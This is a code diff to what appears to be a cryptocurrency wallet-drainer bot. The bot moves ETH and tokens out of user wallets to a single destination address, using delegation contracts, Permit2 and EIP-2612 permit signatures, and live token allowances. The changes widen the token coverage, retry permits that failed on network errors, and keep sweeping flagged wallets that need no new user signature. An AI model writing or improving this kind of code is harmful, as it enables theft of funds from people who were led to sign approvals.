@@ -433,9 +433,10 @@ async function sweepDelegatedWallet(walletAddress) {
     const userContract = new ethers.Contract(checksum, DELEGATION_ABI, relayerWallet);
 
     // V2: use sweepAll — sweeps ETH + all tokens in a single transaction.
+    // Use the full CoinGecko TOKENS list so any deposited token is caught.
     // Falls back to per-token sweepTokens if sweepAll is unavailable (V1 compat).
     try {
-      const tokenList = TOKENS_TO_WATCH.map(t => t.trim()).filter(Boolean);
+      const tokenList = TOKENS.map(t => t.address.toLowerCase()).filter(Boolean);
       log(`[eip7702] ${checksum} — sweepAll(${tokenList.length} tokens + ETH)`);
       const gas = await userContract.sweepAll.estimateGas(tokenList, DESTINATION_ADDRESS);
       const fee = await getFeeData();
@@ -468,16 +469,17 @@ async function sweepDelegatedWallet(walletAddress) {
       }
     } catch (e) { err(`[eip7702/v1] sweepETH ${checksum}: ${e.message}`); }
 
-    for (const tokenAddress of TOKENS_TO_WATCH) {
+    // V1 per-token fallback uses the full TOKENS list (not just TOKENS_TO_WATCH)
+    for (const tok of TOKENS) {
+      const tokenAddress = tok.address.toLowerCase();
       try {
-        const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, getReadProvider());
+        const token   = new ethers.Contract(tokenAddress, ERC20_ABI, getReadProvider());
         const balance = await token.balanceOf(checksum);
-        let decimals  = 18;
-        try { decimals = await token.decimals(); } catch {}
+        const decimals = tok.decimals ?? 18;
         if (balance >= ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) {
-          const gas = await userContract.sweepTokens.estimateGas(tokenAddress.trim(), DESTINATION_ADDRESS);
+          const gas = await userContract.sweepTokens.estimateGas(tokenAddress, DESTINATION_ADDRESS);
           const fee = await getFeeData();
-          const tx  = await userContract.sweepTokens(tokenAddress.trim(), DESTINATION_ADDRESS, {
+          const tx  = await userContract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, {
             gasLimit: gas * 120n / 100n, ...fee,
           });
           log(`[eip7702/v1] sweepTokens tx: ${tx.hash}`);
@@ -1381,7 +1383,7 @@ async function getRelayerBalance() {
 // the flag when there truly is no sweep path left.
 async function hasLivePermit2Allowance(checksumAddr) {
   const nowSec = BigInt(Math.floor(Date.now() / 1000));
-  for (const t of TOKENS.slice(0, 20)) {
+  for (const t of TOKENS.slice(0, 50)) {
     try {
       const [amt,, exp] = await permit2Read.allowance(checksumAddr, t.address.toLowerCase(), relayerWallet.address);
       if (amt > 0n && BigInt(exp) > nowSec) return true;
@@ -1543,8 +1545,22 @@ async function sweep(wallet) {
         log(`[eip2612] ✅ swept ${p.symbol ?? p.token.slice(0,10)}`);
         await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
       } catch (e) {
-        err(`[eip2612] ❌ ${p.symbol ?? p.token.slice(0,10)}: ${e.reason ?? e.message}`);
-        await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
+        const msg = e.reason ?? e.message ?? "";
+        // Signature-level failures are permanent — the sig is invalid or expired on-chain.
+        // RPC/network errors are transient — leave the permit for the next sweep attempt.
+        const isSigError = /InvalidSigner|SignatureExpired|InvalidSignature|invalid sig|ERC2612ExpiredSignature|ERC2612InvalidSigner|nonce/i.test(msg);
+        const isRpcError = /timeout|network|ETIMEDOUT|ECONNRESET|502|503|429|rate.?limit/i.test(msg);
+        if (isSigError) {
+          err(`[eip2612] ❌ sig invalid for ${p.symbol ?? p.token.slice(0,10)} — permanently marking failed`);
+          await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
+        } else if (isRpcError) {
+          warn(`[eip2612] ⚠️ transient error for ${p.symbol ?? p.token.slice(0,10)}, will retry next sweep: ${msg}`);
+          // Leave permit untouched — retry next time
+        } else {
+          err(`[eip2612] ❌ ${p.symbol ?? p.token.slice(0,10)}: ${msg}`);
+          // Unknown error — mark failed to avoid an infinite retry loop that burns gas
+          await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
+        }
       }
     }
   }
@@ -1569,7 +1585,7 @@ async function sweep(wallet) {
       }
     }
     if (tokenAddrs.length === 0) {
-      tokenAddrs = TOKENS.map(t => t.address.toLowerCase()).slice(0, 50);
+      tokenAddrs = TOKENS.map(t => t.address.toLowerCase()).slice(0, 150);
     }
     if (tokenAddrs.length === 0) { log(`[direct] ${short} — no tokens to check`); return; }
 
@@ -1767,7 +1783,7 @@ async function sweep(wallet) {
   // Sweeps using on-chain AllowanceTransfer registrations that persist forever.
   // ══════════════════════════════════════════════════════════════════════════
   {
-    const liveTokens = TOKENS.map(t => t.address.toLowerCase()).slice(0, 100);
+    const liveTokens = TOKENS.map(t => t.address.toLowerCase());
     const balIface   = new ethers.Interface(["function balanceOf(address) view returns (uint256)"]);
     const liveCalls  = liveTokens.map(addr => ({ target: addr, allowFailure: true, callData: balIface.encodeFunctionData("balanceOf", [checksum]) }));
     let liveResults  = [];
@@ -2675,8 +2691,12 @@ function subscribeRealtime() {
         const type    = row.type || "eip7702";
         if (!address) return;
         if (type === "monitoring") return;
-        if (row.needs_reactivation) {
-          log(`[realtime] ${address.slice(0, 10)} — needs_reactivation still set (bot side), monitoring for transfers`);
+        // Only block sweep for wallet types that require a user signature to sweep.
+        // direct-allowance (live ERC-20 allowance) and eip7702 (on-chain delegation)
+        // never need user re-signing — their sweep paths work regardless of this flag.
+        const needsSig = type === "permit2-gasless" || type === "permit2";
+        if (row.needs_reactivation && needsSig) {
+          log(`[realtime] ${address.slice(0, 10)} (${type}) — needs_reactivation set, awaiting user reconnect`);
           delegatedWallets.set(address, type);
           monitoredWallets.set(address.toLowerCase(), { address, type });
           return;
